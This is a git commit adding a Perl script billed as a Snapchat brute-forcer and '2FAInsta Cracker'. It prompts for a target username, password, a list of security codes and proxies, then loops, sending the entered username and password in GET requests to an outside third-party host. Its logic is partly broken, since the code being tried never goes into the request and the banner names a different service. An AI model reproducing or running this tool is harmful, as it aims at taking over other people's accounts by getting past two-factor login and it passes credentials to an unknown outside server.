192e2e56f0e92a4715c13f8b6af7fff1d2aa5533
1337r00t <u9cc85@gmail.com>
2017-08-03 09:52:49 +0300

    Script Brute Force Snapchat

---
+++ brute.pl
@@ -0,0 +1,102 @@
+use LWP::UserAgent;
+system('cls');
+system('color 1e');
+print '
+###################
+# Coded By 1337r00t
+###################
+...........................................................................
+.%%%%....%%%%%%..%%%%%%..%%%%%%.......%%%%%%\...../%%%\..../%%%\....%%%%%%.
+...%%........%%......%%.....(%/.......%%....%)...%:...:%..%:...:%.....%%...
+...%%....%%%%%%..%%%%%%....(%/........%%%%)%.}...%:...:%..%:...:%.....%%...
+...%%........%%......%%...(%/.........%%...\%)...%:...:%..%:...:%.....%%...
+.%%%%%%..%%%%%%..%%%%%%..(%...........%%....\%)...\%%%/....\%%%/......%%...
+...........................................................................
+\n';
+print qq(
+#============================#
+#     2FAInsta Cracker       #
+#     C0ded by 1337r00t      #
+#    Instagram: 1337r00t     #
+#============================#\n
+\n1 - With Proxy\n2 - Without Proxy\n\n> );
+$do = <STDIN>;
+chomp($do);
+system('cls');
+#######################################################################################
+if ($do == 1){
+	print qq(
+	Enter Proxys File:
+	> );
+	$proxylist=<STDIN>;
+	chomp($proxylist);
+	open (PROXYFILE, "<$proxylist") || die "[-] Can't Found The List Of Proxys !";
+	@PROXYS = <PROXYFILE>;
+	close PROXYFILE;
+	
+	print qq(
+	Enter Username :
+	> );
+	$user=<STDIN>;
+	chomp($user);
+	
+	print qq(
+	Enter Password :
+	> );
+	$pass=<STDIN>;
+	chomp($pass);
+	
+	print qq(
+	Enter Security Codes File:
+	> );
+	$codelist=<STDIN>;
+	chomp($codelist);
+	open (CODEFILE, "<$codelist") || die "[-] Can't Found The List Of Codes !";
+	@CODES = <CODEFILE>;
+	close CODEFILE;
+	######################
+	foreach $code (@CODES) {
+	chomp $code;
+		foreach $proxy (@PROXYS) {
+		chomp $proxy;
+			$ua = LWP::UserAgent->new();
+			$request = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$user&password=$pass&proxy=$proxy");
+			$response = $ua->request($request);
+			$output = $response->content();
+			print "$output\n";
+		}
+	}
+}
+##################################################################################
+if ($do == 2){
+
+print qq(
+Enter Username :
+> );
+$user2=<STDIN>;
+chomp($user2);
+
+print qq(
+Enter Password :
+> );
+$pass2=<STDIN>;
+chomp($pass2);
+
+print qq(
+Enter Security Codes File:
+> );
+$codelist2=<STDIN>;
+chomp($codelist2);
+open (CODEFILE2, "<$codelist2") || die "[-] Can't Found The List Of Codes !";
+@CODES2 = <CODEFILE2>;
+close CODEFILE2;
+######################
+foreach $code2 (@CODES2) {
+chomp $code2;
+	$ua2 = LWP::UserAgent->new();
+	$request2 = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/snapchat/proxy.php?username=$user2&password=$pass2");
+	$response2 = $ua2->request($request2);
+	$output2 = $response2->content();
+	print "$output2\n";
+}
+}
